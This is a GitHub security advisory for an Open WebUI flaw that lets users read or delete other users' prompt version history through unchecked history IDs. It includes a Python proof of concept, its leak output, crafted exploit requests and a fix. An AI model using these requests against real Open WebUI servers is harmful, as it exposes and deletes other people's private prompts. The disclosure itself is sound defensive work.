# [M] Open WebUI Prompt history IDOR: unbound history_id allows cross-prompt read and deletion

## Summary
Severity: Medium
Advisory: GHSA-4r4w-2wgp-w7cj
CVE: CVE-2026-54015
CWE: CWE-284, CWE-639
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:L (CVSS_V3)
Published: 2026-06-17
Source: https://github.com/advisories/GHSA-4r4w-2wgp-w7cj
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.9.6

## Details
## Summary

Open WebUI's prompt version-history endpoints authorize the `prompt_id` in the URL but then act on caller-supplied history IDs without verifying that the history row belongs to that prompt (`history_entry.prompt_id == prompt.id`). Three operations are affected:

- `GET /api/v1/prompts/id/{prompt_id}/history/diff` — returns another prompt's history snapshots (read).
- `POST /api/v1/prompts/id/{prompt_id}/update/version` — restores another prompt's snapshot into the caller's prompt, exposing its content (read).
- `DELETE /api/v1/prompts/id/{prompt_id}/history/{history_id}` — deletes another prompt's history entry (delete).

An authenticated user with access to any prompt they control, plus a victim `prompt_history.id`, can read or delete another user's private prompt history. The single-entry read endpoint (`GET .../history/{history_id}`) already enforces the binding; these three did not.

## Impact

Security boundary crossed: prompt confidentiality and integrity.

Prompt history snapshots can contain private prompt text, internal instructions, and sensitive variables. With a known victim `prompt_history.id`, an attacker can read another user's snapshot (via the diff endpoint or by restoring it into their own prompt) and delete another user's history entry. The active prompt row is not destroyed; the delete impact is against version history. Exploitation requires knowing or obtaining victim history UUIDs, so severity depends on adjacent ID exposure.

## Root Cause

The route checks read access only for `prompt_id`:

```python
# backend/open_webui/routers/prompts.py
prompt = await Prompts.get_prompt_by_id(prompt_id, db=db)
...
if not (
    user.role == 'admin'
    or prompt.user_id == user.id
    or await AccessGrants.has_access(
        user_id=user.id,
        resource_type='prompt',
        resource_id=prompt.id,
        permission='read',
        db=db,
    )
):
    raise HTTPException(...)
```

But the authorized prompt ID is not passed into the diff sink:

```python
# backend/open_webui/routers/prompts.py
diff = await PromptHistories.compute_diff(from_id, to_id, db=db)
```

`compute_diff()` fetches both history entries globally by ID and returns their full snapshots:

```python
# backend/open_webui/models/prompt_history.py
result_from = await db.execute(select(PromptHistory).filter(PromptHistory.id == from_id))
from_entry = result_from.scalars().first()
result_to = await db.execute(select(PromptHistory).filter(PromptHistory.id == to_id))
to_entry = result_to.scalars().first()
...
return {
    'from_snapshot': from_snapshot,
    'to_snapshot': to_snapshot,
    ...
}
```

There is no check that `from_entry.prompt_id == prompt_id` or `to_entry.prompt_id == prompt_id`.

The same missing binding affects two further endpoints. `POST .../update/version` restores a snapshot fetched globally by `version_id`:

```python
# backend/open_webui/models/prompts.py — update_prompt_version
history_entry = await PromptHistories.get_history_entry_by_id(version_id, db=session)
...
prompt.content = snapshot.get('content', prompt.content)   # foreign snapshot copied into caller's prompt
prompt.version_id = version_id
```

`DELETE .../history/{history_id}` deletes an entry fetched globally by `history_id`:

```python
# backend/open_webui/models/prompt_history.py — delete_history_entry
result = await db.execute(select(PromptHistory).filter_by(id=history_id))
entry = result.scalars().first()
...
await db.delete(entry)
```

Neither checks `entry.prompt_id == prompt.id`. The single-entry read endpoint (`GET .../history/{history_id}`) does (`history_entry.prompt_id != prompt.id → 404`); these three endpoints were missing it.

## PoC

```python
#!/usr/bin/env python3
"""
PoC for prompt history diff IDOR.

The PoC executes:
  - the real routers.prompts.get_prompt_diff() route function
  - the real PromptHistories.compute_diff() implementation

Fake model/DB adapters are used only to avoid requiring a running server. The
security-sensitive behavior under test is that the route authorizes the prompt
ID in the URL, then computes a diff for arbitrary history IDs without checking
that those history rows belong to the authorized prompt.
"""

from __future__ import annotations

import asyncio
import json
import os
import sys
import types
from pathlib import Path
from types import SimpleNamespace


def prepare_imports() -> None:
    repo_root = Path(__file__).resolve().parents[1]
    sys.path.insert(0, str(repo_root / "backend"))
    os.environ["VECTOR_DB"] = "none"

    class DummyTyper:
        def command(self, *args, **kwargs):
            return lambda fn: fn

    sys.modules.setdefault(
        "typer",
        types.SimpleNamespace(
            Typer=lambda *args, **kwargs: DummyTyper(),
            Option=lambda *args, **kwargs: None,
            echo=lambda *args, **kwargs: None,
            Exit=Exception,
        ),
    )
    sys.modules.setdefault("uvicorn", types.SimpleNamespace(run=lambda *args, **kwargs: None))


class FakeScalarResult:
    def __init__(self, row):
        self.row = row

    def first(self):
        return self.row


class FakeExecuteResult:
    def __init__(self, row):
        self.row = row

    def scalars(self):
        return FakeScalarResult(self.row)


class FakePromptHistoryDb:
    def __init__(self, rows):
        self.rows = rows
        self.calls = 0

    async def execute(self, stmt):
        row = self.rows[self.calls]
        self.calls += 1
        return FakeExecuteResult(row)


class FakeDbContext:
    def __init__(self, db):
        self.db = db

    async def __aenter__(self):
        return self.db

    async def __aexit__(self, exc_type, exc, tb):
        return False


async def run_real_compute_diff(from_id: str, to_id: str):
    import open_webui.models.prompt_history as history_module

    victim_from = SimpleNamespace(
        id=from_id,
        prompt_id="victim-prompt",
        snapshot={
            "name": "Victim Prompt",
            "command": "/victim",
            "content": "PRIVATE_PROMPT_SECRET_V1",
        },
    )
    victim_to = SimpleNamespace(
        id=to_id,
        prompt_id="victim-prompt",
        snapshot={
            "name": "Victim Prompt",
            "command": "/victim",
            "content": "PRIVATE_PROMPT_SECRET_V2",
        },
    )

    fake_db = FakePromptHistoryDb([victim_from, victim_to])
    original_context = history_module.get_async_db_context
    try:
        history_module.get_async_db_context = lambda db=None: FakeDbContext(fake_db)
        diff = await history_module.PromptHistories.compute_diff(from_id, to_id)
    finally:
        history_module.get_async_db_context = original_context

    return diff


async def main() -> None:
    prepare_imports()

    import open_webui.routers.prompts as prompts_router

    attacker_prompt = SimpleNamespace(
        id="attacker-prompt",
        user_id="attacker",
    )
    attacker = SimpleNamespace(id="attacker", role="user")
    victim_from_id = "victim-history-from"
    victim_to_id = "victim-history-to"

    class FakePrompts:
        looked_up_prompt_ids = []

        async def get_prompt_by_id(self, prompt_id, db=None):
            self.looked_up_prompt_ids.append(prompt_id)
            if prompt_id == "attacker-prompt":
                return attacker_prompt
            return None

    class FakeAccessGrants:
        async def has_access(self, *args, **kwargs):
            return False

    class FakePromptHistories:
        compute_diff_calls = []

        async def compute_diff(self, from_id, to_id, db=None):
            self.compute_diff_calls.append(
                {
                    "from_id": from_id,
                    "to_id": to_id,
                    "authorized_prompt_id_not_passed": True,
                }
            )
            return await run_real_compute_diff(from_id, to_id)

    fake_prompts = FakePrompts()
    fake_histories = FakePromptHistories()

    original = {
        "Prompts": prompts_router.Prompts,
        "AccessGrants": prompts_router.AccessGrants,
        "PromptHistories": prompts_router.PromptHistories,
    }
    try:
        prompts_router.Prompts = fake_prompts
        prompts_router.AccessGrants = FakeAccessGrants()
        prompts_router.PromptHistories = fake_histories

        diff = await prompts_router.get_prompt_diff(
            prompt_id="attacker-prompt",
            from_id=victim_from_id,
            to_id=victim_to_id,
            user=attacker,
            db=None,
        )
    finally:
        for name, value in original.items():
            setattr(prompts_router, name, value)

    result = {
        "confirmed": (
            diff.get("from_snapshot", {}).get("content") == "PRIVATE_PROMPT_SECRET_V1"
            and diff.get("to_snapshot", {}).get("content") == "PRIVATE_PROMPT_SECRET_V2"
            and fake_prompts.looked_up_prompt_ids == ["attacker-prompt"]
            and fake_histories.compute_diff_calls
            and fake_histories.compute_diff_calls[0]["authorized_prompt_id_not_passed"] is True
        ),
        "attacker_user_id": "attacker",
        "authorized_prompt_id": "attacker-prompt",
        "victim_prompt_id": "victim-prompt",
        "victim_history_ids": [victim_from_id, victim_to_id],
        "prompt_ids_authorized_by_route": fake_prompts.looked_up_prompt_ids,
        "compute_diff_calls": fake_histories.compute_diff_calls,
        "leaked_from_snapshot": diff.get("from_snapshot"),
        "leaked_to_snapshot": diff.get("to_snapshot"),
        "source": {
            "route": "backend/open_webui/routers/prompts.py:get_prompt_diff",
            "sink": "backend/open_webui/models/prompt_history.py:PromptHistories.compute_diff",
        },
    }
    print(json.dumps(result, indent=2, sort_keys=True))
    if not result["confirmed"]:
        raise SystemExit(1)


if __name__ == "__main__":
    asyncio.run(main())
```

The PoC executes the real route function and the real `PromptHistories.compute_diff()` implementation with fake model/DB adapters. It authorizes the attacker against `attacker-prompt`, then supplies two victim history IDs. The route returns the victim prompt snapshots.

Result:

```json
{
  "attacker_user_id": "attacker",
  "authorized_prompt_id": "attacker-prompt",
  "confirmed": true,
  "leaked_from_snapshot": {
    "command": "/victim",
    "content": "PRIVATE_PROMPT_SECRET_V1",
    "name": "Victim Prompt"
  },
  "leaked_to_snapshot": {
    "command": "/victim",
    "content": "PRIVATE_PROMPT_SECRET_V2",
    "name": "Victim Prompt"
  },
  "prompt_ids_authorized_by_route": [
    "attacker-prompt"
  ],
  "victim_history_ids": [
    "victim-history-from",
    "victim-history-to"
  ],
  "victim_prompt_id": "victim-prompt"
}
```

## Exploit Sketch

Read via the diff endpoint:

1. Attacker has read access to `ATTACKER_PROMPT_ID`.
2. Attacker knows two history IDs for a victim prompt: `VICTIM_FROM_HISTORY_ID` and `VICTIM_TO_HISTORY_ID`.
3. Attacker requests:

```text
GET /api/v1/prompts/id/ATTACKER_PROMPT_ID/history/diff?from_id=VICTIM_FROM_HISTORY_ID&to_id=VICTIM_TO_HISTORY_ID
```

4. The server authorizes `ATTACKER_PROMPT_ID`, then returns snapshots for the victim history IDs.

Read via restore (`update/version`): the attacker `POST`s `{"version_id": "VICTIM_HISTORY_ID"}` to their own prompt's `update/version`, then `GET`s their prompt; it now holds the victim snapshot's name/content/data/meta/tags.

Delete: the attacker sends `DELETE /api/v1/prompts/id/ATTACKER_PROMPT_ID/history/VICTIM_HISTORY_ID`; the victim history entry is removed.

## Recommended Fix

Bind every prompt-history operation to the authorized prompt before acting on a history ID, mirroring the single-entry read endpoint:

- `compute_diff()` should accept `prompt_id` and query both entries with `PromptHistory.prompt_id == prompt_id` alongside the id filter.
- `delete_history_entry()` should accept `prompt_id` and filter `filter_by(id=history_id, prompt_id=prompt_id)`.
- `update_prompt_version()` should reject `history_entry.prompt_id != prompt_id` before restoring.

Return 404/403 on mismatch.

## Consolidation

Per our Report Handling policy this consolidates independent reports of the same prompt-history authorization flaw (one missing `history_entry.prompt_id == prompt.id` binding) reached through different endpoints:

- Diff-endpoint read and history deletion: @0xEr3n (earliest filings).
- `update/version` restore-read: distinct path demonstrated by @5yu4n.

One CVE for the consolidated advisory.

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-4r4w-2wgp-w7cj
- https://nvd.nist.gov/vuln/detail/CVE-2026-54015
- https://github.com/advisories/GHSA-4r4w-2wgp-w7cj
- https://github.com/open-webui/open-webui
- https://github.com/pypa/advisory-database/tree/main/vulns/open-webui/PYSEC-2026-2701.yaml
- https://pypi.org/project/open-webui
